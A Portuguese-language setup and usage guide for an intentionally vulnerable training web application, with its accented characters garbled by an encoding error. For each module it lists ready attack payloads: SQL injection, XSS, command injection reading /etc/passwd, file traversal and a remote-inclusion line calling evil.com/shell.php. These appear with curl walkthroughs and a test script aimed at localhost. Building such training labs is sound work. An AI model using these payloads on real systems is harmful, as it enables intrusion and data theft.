# üöÄ CyberLab Professional - Guia Completo de Instala√ß√£o e Uso

> **‚ö†Ô∏è ATEN√á√ÉO**: Esta aplica√ß√£o cont√©m vulnerabilidades INTENCIONAIS para fins educacionais. Use apenas em ambientes isolados e controlados.

## üìã **√çNDICE**
1. [Pr√©-requisitos](#-pr√©-requisitos)
2. [Instala√ß√£o via Docker (Recomendado)](#-instala√ß√£o-via-docker-recomendado)
3. [Instala√ß√£o Manual](#-instala√ß√£o-manual)
4. [Como Usar a Aplica√ß√£o](#-como-usar-a-aplica√ß√£o)
5. [M√≥dulos Vulner√°veis](#-m√≥dulos-vulner√°veis)
6. [Troubleshooting](#-troubleshooting)

---

## üîß **PR√â-REQUISITOS**

### **Requisitos M√≠nimos:**
- **Docker** 20.10+ e **Docker Compose** 2.0+ (Recomendado)
- **OU** Node.js 18+ e npm 8+ (Instala√ß√£o manual)
- **Sistema Operacional**: Linux, macOS, ou Windows 10/11
- **RAM**: M√≠nimo 4GB (Recomendado 8GB)
- **Armazenamento**: 2GB livres

### **Instala√ß√£o do Docker:**

#### **Ubuntu/Debian:**
```bash
# Atualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Instalar Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Adicionar usu√°rio ao grupo docker
sudo usermod -aG docker $USER
newgrp docker
```

#### **Windows/macOS:**
- Baixe e instale **Docker Desktop** do site oficial: https://www.docker.com/products/docker-desktop

---

## üê≥ **INSTALA√á√ÉO VIA DOCKER (RECOMENDADO)**

### **Passo 1: Clonar o Reposit√≥rio**
```bash
# Clonar o reposit√≥rio
git clone https://github.com/dionebr/cyberlab.git
cd cyberlab
```

### **Passo 2: Configurar Ambiente**
```bash
# Verificar se o Docker est√° funcionando
docker --version
docker-compose --version

# Criar network isolada (opcional, para mais seguran√ßa)
docker network create cyberlab-network
```

### **Passo 3: Iniciar com Docker Compose**
```bash
# Construir e iniciar todos os servi√ßos
docker-compose up -d --build

# Verificar se os servi√ßos est√£o rodando
docker-compose ps

# Verificar logs
docker-compose logs -f
```

### **Passo 4: Verificar Instala√ß√£o**
```bash
# Verificar sa√∫de da aplica√ß√£o (aguarde 1-2 minutos)
curl http://localhost:5001/api/status

# Verificar frontend
curl -I http://localhost:8080

# Ver logs em tempo real
docker-compose logs -f backend
```

### **Passo 5: Acessar a Aplica√ß√£o**
- **üåê Frontend**: http://localhost:8080
- **‚ö° Backend API**: http://localhost:5001
- **üìä Analytics**: http://localhost:5001/api/analytics/dashboard
- **üîç API Status**: http://localhost:5001/api/status

---

## ‚öôÔ∏è **INSTALA√á√ÉO MANUAL**

### **Passo 1: Clonar e Preparar**
```bash
# Clonar o reposit√≥rio
git clone https://github.com/dionebr/cyberlab.git
cd cyberlab

# Verificar vers√µes
node --version  # deve ser 18+
npm --version   # deve ser 8+
```

### **Passo 2: Instalar Depend√™ncias**
```bash
# Instalar depend√™ncias do frontend
npm install

# Instalar depend√™ncias do backend
cd backend
npm install
cd ..
```

### **Passo 3: Configurar Backend**
```bash
cd backend

# Criar arquivo de environment
cp .env.example .env

# Editar configura√ß√µes (opcional)
nano .env
```

### **Passo 4: Iniciar Aplica√ß√£o**
```bash
# Terminal 1: Iniciar backend
cd backend
npm run dev
# Backend rodar√° em http://localhost:5001

# Terminal 2: Iniciar frontend (nova aba do terminal)
cd ..  # voltar para raiz do projeto
npm run dev
# Frontend rodar√° em http://localhost:8080
```

---

## üéØ **COMO USAR A APLICA√á√ÉO**

### **Primeiro Acesso:**

1. **Abra o navegador** em `http://localhost:8080`
2. **Escolha o idioma** (Portugu√™s, Ingl√™s, Espanhol)
3. **Selecione o n√≠vel de seguran√ßa**: Easy, Medium, Hard
4. **Navegue pelos m√≥dulos** usando a sidebar lateral

### **Interface Principal:**

#### **üìö Learn Mode (Modo Aprendizado):**
- Acesse via menu lateral ‚Üí "Learn"
- **Categorias dispon√≠veis**:
  - Security Fundamentals
  - Web Security  
  - Network Security
  - Operating Systems Security
  - Secure Programming
- **Recursos**:
  - Li√ß√µes estruturadas
  - Exerc√≠cios pr√°ticos
  - Sistema de progresso
  - Conte√∫do em m√∫ltiplos idiomas

#### **üéØ Challenge Mode (Desafios Pr√°ticos):**
- Acesse via menu lateral ‚Üí "Challenges"
- **12 m√≥dulos** de vulnerabilidade dispon√≠veis
- **N√≠veis de dificuldade** ajust√°veis
- **Feedback educacional** em tempo real

---

## üî¥ **M√ìDULOS VULNER√ÅVEIS DISPON√çVEIS**

### **1. SQL Injection** üóÉÔ∏è
**Endpoint**: `/api/vulnerable/users/search`

**Payloads para testar**:
```sql
-- Bypass b√°sico
admin' OR '1'='1' --

-- Union attack
admin' UNION SELECT username,password,email,role FROM users --

-- Coment√°rio MySQL
admin' OR 1=1#

-- Bypass com espa√ßos
admin'/**/OR/**/'1'='1'/**/--
```

**Como usar**:
1. Acesse o m√≥dulo SQL Injection
2. Digite um payload no campo de busca
3. Observe os dados vazados
4. Analise a explica√ß√£o educacional

### **2. Cross-Site Scripting (XSS)** üï∑Ô∏è
**Endpoints**: 
- `/api/xss/reflected` (XSS Refletido)
- `/api/xss/comments` (XSS Armazenado)
- `/api/xss/dom` (XSS Baseado em DOM)

**Payloads para testar**:
```html
<!-- B√°sico -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror="alert('XSS')">

<!-- SVG -->
<svg onload="alert('XSS')">

<!-- Bypass de filtros -->
<ScRiPt>alert('XSS')</ScRiPt>
```

### **3. Command Injection** ‚ö°
**Endpoints**:
- `/api/cmd/ping` (Inje√ß√£o b√°sica)
- `/api/cmd/network-tools` (Ferramentas de rede)
- `/api/cmd/system-info` (Informa√ß√µes do sistema)

**Payloads para testar**:
```bash
# Separador de comandos
127.0.0.1; id

# Operador AND
127.0.0.1 && whoami

# Pipe
127.0.0.1 | cat /etc/passwd

# Background
127.0.0.1 & ps aux
```

### **4. File Upload** üìÅ
**Endpoint**: `/api/upload`

**T√©cnicas para testar**:
- Upload de arquivos `.php`, `.jsp`, `.aspx`
- Bypass de extens√£o: `shell.php.jpg`
- Path traversal: `../../../etc/passwd`
- Polyglot files (m√∫ltiplos formatos)

### **5. Authentication Bypass** üîì
**Endpoints**: 
- `/api/auth/login`
- `/api/auth/admin`

**T√©cnicas**:
- SQL injection no login
- Manipula√ß√£o de sess√£o
- Bypass de autoriza√ß√£o
- Escala√ß√£o de privil√©gios

### **6. Brute Force** üí•
**Endpoint**: `/api/auth/bruteforce`

**Caracter√≠sticas**:
- Tentativas ilimitadas (easy mode)
- Rate limiting b√°sico (medium mode)  
- CAPTCHA e lockout (hard mode)
- An√°lise de timing

### **7. CSRF (Cross-Site Request Forgery)** üé≠
**Endpoints**:
- `/api/csrf/transfer` (Transfer√™ncia de fundos)
- `/api/csrf/profile` (Altera√ß√£o de perfil)

**T√©cnicas**:
- Bypass de token CSRF
- SameSite cookie exploitation
- Ataques baseados em referrer

### **8. File Inclusion** üìÑ
**Endpoints**:
- `/api/file/lfi` (Local File Inclusion)
- `/api/file/rfi` (Remote File Inclusion)

**Payloads**:
```bash
# LFI
../../../etc/passwd
....//....//....//etc/passwd

# RFI  
http://evil.com/shell.php
data://text/plain,<?php phpinfo();?>
```

### **9. Session Management** üîê
**Endpoints**:
- `/api/session/create`
- `/api/session/validate`

**Vulnerabilidades**:
- Session ID predic√°vel
- Session fixation
- Falta de rota√ß√£o de sess√£o
- Cookies inseguros

### **10. Blind SQL Injection** üïµÔ∏è
**Endpoint**: `/api/blind/search`

**T√©cnicas**:
- Boolean-based blind injection
- Time-based blind injection
- Error-based information extraction

### **11. Insecure Captcha** ü§ñ
**Endpoints**:
- `/api/captcha/generate`
- `/api/captcha/verify`

**Vulnerabilidades**:
- Gera√ß√£o previs√≠vel
- Valida√ß√£o client-side
- Bypass methods dispon√≠veis
- Algoritmos fixos

---

## üìä **MONITORAMENTO E ANALYTICS**

### **Dashboard de Ataques:**
```bash
# Acessar dashboard completo
curl http://localhost:5001/api/analytics/dashboard

# Ver ataques recentes
curl http://localhost:5001/api/analytics/attacks

# Reset das estat√≠sticas (para testes)
curl -X DELETE http://localhost:5001/api/analytics/reset
```

### **M√©tricas Dispon√≠veis:**
- **Total de tentativas** de ataque
- **Taxa de sucesso** por m√≥dulo
- **Estat√≠sticas por dificuldade**
- **Timeline** de ataques
- **IPs mais ativos**
- **M√≥dulos mais atacados**

### **Logs em Tempo Real:**
```bash
# Docker
docker-compose logs -f backend

# Manual
tail -f backend/logs/application.log
```

---

## üîí **CONFIGURA√á√ïES DE SEGURAN√áA**

### **N√≠veis de Dificuldade:**

#### **Easy (F√°cil):**
- ‚ùå **Sem filtros** ou sanitiza√ß√£o
- ‚ùå **Sem rate limiting**
- ‚ùå **Sem valida√ß√£o** de input
- ‚úÖ **Feedback detalhado** sobre ataques
- ‚úÖ **Vulnerabilidades √≥bvias**

#### **Medium (M√©dio):**
- ‚ö†Ô∏è **Filtros b√°sicos** implementados
- ‚ö†Ô∏è **Algumas prote√ß√µes** ativas
- ‚ö†Ô∏è **Valida√ß√£o superficial**
- ‚úÖ **Bypass poss√≠vel** com t√©cnicas intermedi√°rias
- ‚úÖ **Dicas de bypass** fornecidas

#### **Hard (Dif√≠cil):**
- üõ°Ô∏è **Filtros avan√ßados**
- üõ°Ô∏è **M√∫ltiplas camadas** de prote√ß√£o  
- üõ°Ô∏è **WAF b√°sico** implementado
- ‚ö†Ô∏è **Bypass complexo** necess√°rio
- ‚ö†Ô∏è **T√©cnicas avan√ßadas** requeridas

### **Isolamento de Rede (CR√çTICO):**

‚ö†Ô∏è **NUNCA execute em redes de produ√ß√£o!**

#### **Docker (Recomendado):**
```bash
# Criar rede isolada
docker network create --driver bridge --subnet=172.20.0.0/16 cyberlab-isolated

# Executar com isolamento
docker-compose up -d --network cyberlab-isolated
```

#### **Firewall (Adicional):**
```bash
# Bloquear acesso externo (apenas localhost)
sudo ufw deny from any to any port 5001
sudo ufw allow from 127.0.0.1 to any port 5001
```

---

## üõ†Ô∏è **TROUBLESHOOTING**

### **Problemas Comuns:**

#### **1. Backend n√£o inicia:**
```bash
# Verificar porta em uso
sudo netstat -tlnp | grep :5001

# Matar processo que usa a porta
sudo kill -9 $(lsof -t -i:5001)

# Reiniciar com Docker
docker-compose restart backend

# Ou manual
cd backend && npm run dev
```

#### **2. Frontend n√£o carrega:**
```bash
# Verificar porta 8080
sudo netstat -tlnp | grep :8080

# Limpar cache do npm
npm run dev -- --force

# Ou rebuild
npm run build && npm run dev
```

#### **3. Containers Docker n√£o iniciam:**
```bash
# Verificar logs
docker-compose logs backend
docker-compose logs frontend

# Restart completo
docker-compose down
docker-compose up -d --build

# Verificar espa√ßo em disco
df -h
docker system df
```

#### **4. Erro de conex√£o na API:**
```bash
# Verificar se backend est√° rodando
curl http://localhost:5001/api/status

# Verificar logs de erro
docker-compose logs -f backend

# Verificar vari√°veis de ambiente
docker-compose exec backend env | grep NODE_ENV
```

### **Logs e Debug:**
```bash
# Habilitar logs detalhados
export DEBUG=*
npm run dev

# Verificar sa√∫de dos servi√ßos
curl http://localhost:5001/api/status
curl http://localhost:8080

# Logs do Docker
docker-compose logs --tail=50 backend
```

### **Reset Completo:**
```bash
# Parar todos os servi√ßos
docker-compose down -v

# Remover imagens e cache
docker system prune -af
docker volume prune -f

# Reconstruir tudo
docker-compose build --no-cache
docker-compose up -d

# Aguardar inicializa√ß√£o
sleep 60
curl http://localhost:5001/api/status
```

### **Performance:**
```bash
# Verificar uso de recursos
docker stats

# Limitar recursos (se necess√°rio)
docker-compose up -d --memory="2g" --cpus="2.0"

# Verificar logs de erro de mem√≥ria
dmesg | grep -i "out of memory"
```

---

## üìö **RECURSOS EDUCACIONAIS AVAN√áADOS**

### **Exemplos Pr√°ticos Detalhados:**

#### **SQL Injection Passo a Passo:**
```bash
# 1. Teste b√°sico
curl "http://localhost:5001/api/vulnerable/users/search?username=admin"

# 2. Teste de inje√ß√£o
curl "http://localhost:5001/api/vulnerable/users/search?username=admin'%20OR%20'1'='1'%20--"

# 3. Union attack
curl "http://localhost:5001/api/vulnerable/users/search?username=admin'%20UNION%20SELECT%20username,password,email,role%20FROM%20users%20--"

# 4. An√°lise do resultado
# Observe: dados sens√≠veis expostos, estrutura do banco revelada
```

#### **XSS Completo:**
```bash
# 1. XSS Refletido
curl "http://localhost:5001/api/xss/reflected?search=<script>alert('XSS')</script>"

# 2. XSS Armazenado (POST)
curl -X POST "http://localhost:5001/api/xss/comments/add" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacker","comment":"<script>alert(\"Stored XSS\")</script>"}'

# 3. Visualizar XSS armazenado
curl "http://localhost:5001/api/xss/comments"
```

#### **Command Injection Avan√ßado:**
```bash
# 1. Inje√ß√£o b√°sica
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}'

# 2. Enumera√ß√£o do sistema
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; uname -a"}'

# 3. Listagem de arquivos
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; ls -la /"}'
```

### **Scripts de Automa√ß√£o:**

#### **Teste Automatizado:**
```bash
#!/bin/bash
# test-cyberlab.sh

echo "üß™ CyberLab Automated Testing"

# Verificar se servi√ßos est√£o rodando
if ! curl -s http://localhost:5001/api/status > /dev/null; then
    echo "‚ùå Backend n√£o est√° rodando"
    exit 1
fi

# Teste SQL Injection
echo "üîç Testing SQL Injection..."
SQL_RESULT=$(curl -s "http://localhost:5001/api/vulnerable/users/search?username=admin'%20OR%20'1'='1'%20--")
if echo "$SQL_RESULT" | grep -q "admin"; then
    echo "‚úÖ SQL Injection: VULNER√ÅVEL"
else
    echo "‚ùå SQL Injection: Falhou"
fi

# Teste XSS
echo "üï∑Ô∏è Testing XSS..."
XSS_RESULT=$(curl -s "http://localhost:5001/api/xss/reflected?search=<script>alert('test')</script>")
if echo "$XSS_RESULT" | grep -q "<script>"; then
    echo "‚úÖ XSS: VULNER√ÅVEL"
else
    echo "‚ùå XSS: Falhou"
fi

# Teste Command Injection
echo "‚ö° Testing Command Injection..."
CMD_RESULT=$(curl -s -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}')
if echo "$CMD_RESULT" | grep -q "uid="; then
    echo "‚úÖ Command Injection: VULNER√ÅVEL"
else
    echo "‚ùå Command Injection: Falhou"
fi

echo "üéØ Teste completo!"
```

---

## üéì **OBJETIVOS EDUCACIONAIS DETALHADOS**

### **Para Estudantes de Seguran√ßa:**
- **Compreender vulnerabilidades** na pr√°tica
- **Desenvolver pensamento** de atacante
- **Aprender t√©cnicas** de exploitation
- **Entender impacto** de vulnerabilidades
- **Praticar** em ambiente seguro

### **Para Professores e Instrutores:**
- **Demonstra√ß√µes pr√°ticas** em aula
- **Ambiente controlado** para ensino
- **Material estruturado** e progressivo
- **Analytics** para acompanhar progresso
- **M√∫ltiplos idiomas** para turmas internacionais

### **Para Profissionais de Seguran√ßa:**
- **Treinamento corporativo** em vulnerabilidades
- **Desenvolvimento** de skills de pentest
- **Valida√ß√£o** de conhecimentos pr√°ticos
- **Prepara√ß√£o** para certifica√ß√µes
- **Research** em novas t√©cnicas

### **Para Desenvolvedores:**
- **Entender** vulnerabilidades comuns
- **Aprender** a identificar falhas
- **Desenvolver** c√≥digo mais seguro
- **Testar** aplica√ß√µes pr√≥prias
- **Implementar** controles de seguran√ßa

---

## ‚öñÔ∏è **AVISOS LEGAIS E RESPONSABILIDADES**

### **‚ö†Ô∏è USO RESPONS√ÅVEL OBRIGAT√ìRIO:**

#### **‚úÖ Permitido:**
- ‚úÖ **Uso educacional** em institui√ß√µes de ensino
- ‚úÖ **Pesquisa** em seguran√ßa cibern√©tica  
- ‚úÖ **Treinamento corporativo** autorizado
- ‚úÖ **Prepara√ß√£o** para certifica√ß√µes
- ‚úÖ **Desenvolvimento** de skills √©ticos

#### **üö´ Estritamente Proibido:**
- üö´ **Teste em sistemas** de terceiros sem autoriza√ß√£o
- üö´ **Deployment** em ambiente de produ√ß√£o
- üö´ **Ataques** contra infraestrutura real
- üö´ **Atividades maliciosas** ou ilegais
- üö´ **Viola√ß√£o** de termos de servi√ßo

### **üö® DISCLAIMERS IMPORTANTES:**

‚ö†Ô∏è **Esta aplica√ß√£o √© INTENCIONALMENTE VULNER√ÅVEL**
‚ö†Ô∏è **N√ÉO √© adequada para uso em produ√ß√£o**
‚ö†Ô∏è **Use EXCLUSIVAMENTE em ambiente isolado**
‚ö†Ô∏è **Os autores N√ÉO se responsabilizam por uso inadequado**
‚ö†Ô∏è **Respeite as leis locais sobre seguran√ßa cibern√©tica**

### **üõ°Ô∏è RESPONSABILIDADES DO USU√ÅRIO:**
- **Manter** a aplica√ß√£o em ambiente isolado
- **N√£o expor** √† internet p√∫blica
- **Usar apenas** para fins educacionais
- **Respeitar** propriedade intelectual
- **Seguir** leis e regulamentos locais

---

## ü§ù **SUPORTE E COMUNIDADE**

### **üìû Canais de Suporte:**
- **üêõ Issues**: https://github.com/dionebr/cyberlab/issues
- **üìñ Wiki**: https://github.com/dionebr/cyberlab/wiki
- **üí¨ Discussions**: https://github.com/dionebr/cyberlab/discussions

### **üîÑ Como Contribuir:**
1. **Fork** o reposit√≥rio
2. **Crie** uma branch para sua feature (`git checkout -b feature/nova-funcionalidade`)
3. **Commit** suas mudan√ßas (`git commit -m 'Adiciona nova funcionalidade'`)
4. **Push** para a branch (`git push origin feature/nova-funcionalidade`)  
5. **Abra** um Pull Request

### **üèÜ Tipos de Contribui√ß√£o:**
- **üêõ Bug reports** e corre√ß√µes
- **‚ú® Novas vulnerabilidades** e m√≥dulos
- **üìö Documenta√ß√£o** e tradu√ß√µes
- **üé® Melhorias** na UI/UX
- **‚ö° Performance** e otimiza√ß√µes

---

## üéØ **ROADMAP E PR√ìXIMOS PASSOS**

### **üöÄ Vers√£o 2.1 (Planejada):**
- **API GraphQL** vulner√°vel
- **Mobile vulnerabilities**
- **IoT exploitation** m√≥dulos
- **Cloud security** challenges
- **AI/ML** security testing

### **üîÆ Futuro (v3.0):**
- **Multi-tenant** environment
- **Real-time collaboration**
- **Advanced analytics**
- **Custom vulnerability** creation
- **Integration** com ferramentas de pentest

---

**üéØ CyberLab Professional v2.0 - A Plataforma Definitiva para Educa√ß√£o em Seguran√ßa Cibern√©tica**

*"O conhecimento √© poder, mas o conhecimento aplicado √© transforma√ß√£o"* üöÄ

---

<div align="center">

**‚ö° Desenvolvido com paix√£o pela seguran√ßa cibern√©tica ‚ö°**

[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://www.docker.com/)
[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org/)
[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://reactjs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)

</div>